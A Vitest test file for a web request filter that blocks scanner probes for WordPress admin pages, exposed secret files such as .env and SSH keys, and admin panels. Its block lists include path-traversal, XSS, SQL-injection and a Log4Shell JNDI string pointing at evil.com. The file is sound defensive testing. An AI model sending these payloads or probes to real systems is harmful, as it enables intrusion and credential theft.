import {describe, expect, it} from 'vitest';
import {isBlockedRequest} from '../src/isBlockedRequest';

describe('isBlockedRequest', () => {
  describe('WordPress scanners', () => {
    const wordpressPaths = [
      '/wp-admin',
      '/wp-admin/',
      '/wp-admin/setup-config.php',
      '/wp-login.php',
      '/wp-content/plugins/revslider/temp/update_extract/revslider/update.php',
      '/wp-includes/wlwmanifest.xml',
      '/wp-json/wp/v2/users',
      '/xmlrpc.php',
      '/wp-config.php',
      '/wp-config.php.bak',
      '/wp-cron.php',
      '/wordpress/wp-admin',
      '/de/wp-admin/install.php',
      '/de/blog/wp-login.php',
      '/shop/wp-includes/wlwmanifest.xml',
    ];

    it.each(wordpressPaths)('blocks %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(true);
    });
  });

  describe('config and secret leaks', () => {
    const secretPaths = [
      '/.env',
      '/.env.local',
      '/.env.production',
      '/de/.env',
      '/.git/config',
      '/.git/HEAD',
      '/.svn/entries',
      '/.aws/credentials',
      '/.ssh/id_rsa',
      '/.htaccess',
      '/.DS_Store',
      '/config.php',
      '/phpinfo.php',
      '/docker-compose.yml',
      '/composer.json',
    ];

    it.each(secretPaths)('blocks %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(true);
    });
  });

  describe('admin panels and framework endpoints', () => {
    const adminPaths = [
      '/phpmyadmin',
      '/phpMyAdmin/index.php',
      '/administrator/index.php',
      '/adminer.php',
      '/typo3/index.php',
      '/cgi-bin/test.cgi',
      '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
      '/actuator/health',
      '/server-status',
      '/solr/admin/info/system',
      '/boaform/admin/formLogin',
    ];

    it.each(adminPaths)('blocks %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(true);
    });
  });

  describe('dangerous file extensions', () => {
    const extensionPaths = [
      '/index.php',
      '/something.php',
      '/shell.phtml',
      '/default.asp',
      '/login.aspx',
      '/backup.sql',
      '/dump.zip',
      '/site.tar.gz',
      '/error.log',
      '/config.ini',
      '/app.jar',
    ];

    it.each(extensionPaths)('blocks %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(true);
    });
  });

  describe('traversal and injection attempts', () => {
    const attackPaths = [
      '/../../etc/passwd',
      '/de/%2e%2e/%2e%2e/etc/passwd',
      '/de/page%00.php',
      '/proc/self/environ',
      '/de/?q=<script>alert(1)</script>',
      '/de/page?id=1 UNION SELECT password FROM users',
      '/${jndi:ldap://evil.com/a}',
    ];

    it.each(attackPaths)('blocks %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(true);
    });

    it('blocks invalid URL encoding', () => {
      expect(isBlockedRequest('/de/%E0%A4%A')).toBe(true);
    });
  });

  describe('legitimate paths', () => {
    const validPaths = [
      '/',
      '/de',
      '/en',
      '/de/',
      '/de/home',
      '/de/impressum',
      '/de/datenschutz',
      '/de/agb',
      '/de/kontakt',
      '/de/ueber-uns',
      '/en/about-us',
      '/de/faq',
      '/de/preise',
      '/de/blog',
      '/de/news',
      '/de/shop',
      '/de/media',
      '/de/team',
      '/de/services',
      '/de/partner',
      '/de/karriere',
    ];

    it.each(validPaths)('allows %s', (pathname) => {
      expect(isBlockedRequest(pathname)).toBe(false);
    });
  });

  describe('edge cases', () => {
    it('treats an empty path as not blocked', () => {
      expect(isBlockedRequest('')).toBe(false);
    });

    it('is case insensitive', () => {
      expect(isBlockedRequest('/WP-ADMIN/index.php')).toBe(true);
      expect(isBlockedRequest('/PhpMyAdmin')).toBe(true);
    });

    it('blocks a slug ending in a blocked segment', () => {
      expect(isBlockedRequest('/de/en/wp-admin')).toBe(true);
    });

    it('does not block a slug that merely contains a blocked segment', () => {
      expect(isBlockedRequest('/de/administrator-schulung')).toBe(false);
      expect(isBlockedRequest('/de/wp-admin-alternative')).toBe(false);
    });
  });
});
